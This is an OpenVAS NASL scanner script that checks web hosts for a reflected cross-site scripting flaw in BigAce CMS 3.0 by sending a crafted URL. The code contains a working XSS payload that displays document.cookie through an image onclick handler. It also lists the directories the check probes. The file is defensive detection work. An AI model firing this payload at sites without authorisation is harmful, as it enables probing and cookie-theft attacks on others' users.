###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bigace_cms_xss_vuln.nasl 5819 2017-03-31 10:57:23Z cfi $
#
# BigAce CMS Cross-Site Scripting Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805564");
  script_version("$Revision: 5819 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-03-31 12:57:23 +0200 (Fri, 31 Mar 2017) $");
  script_tag(name:"creation_date", value:"2015-05-20 15:59:54 +0530 (Wed, 20 May 2015)");
  script_name("BigAce CMS Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with BigAce CMS and
  is prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"The flaw exists as the application does not
  validate input before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.

  Impact Level: Application");

  script_tag(name:"affected", value:"BigAce CMS version 3.0, prior versions may
  also be affected.");

  script_tag(name:"solution", value:"No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2015050043");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/131806");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = "";
sndReq = "";
rcvRes = "";

http_port = get_http_port(default:80);

foreach dir (make_list_unique("/", "/bigace", "/cms", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";
  rcvRes = http_get_cache(item:string(dir, "/"), port:http_port);

  ## Confirm Application
  if('content="BIGACE' >< rcvRes)
  {
    ## Construct Attack Request
    url = dir + '/%22%3E%3Cimg%20src=d%20onclick=confirm(document.cookie);%3E';

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:http_port, url:url, check_header:FALSE,
       pattern:"<img src=d onclick=confirm\(document\.cookie\)"))
    {
      report = report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);
